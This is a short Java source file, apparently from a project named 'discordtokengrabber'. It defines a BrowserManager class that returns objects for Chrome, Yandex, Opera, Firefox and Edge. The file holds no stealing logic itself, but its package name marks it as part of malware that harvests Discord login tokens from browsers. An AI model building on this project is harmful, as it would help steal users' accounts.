package com.github.dedinc.discordtokengrabber.browsers;

public class BrowserManager {

	public static Chrome getChrome() {
		return new Chrome();
	}
	
	public static Yandex getYandex() {
		return new Yandex();
	}

	public static Opera getOpera() {
		return new Opera();
	}
	
	public static Firefox getFirefox() {
		return new Firefox();
	}
	
	public static Edge getEdge() {
		return new Edge();
	}
}
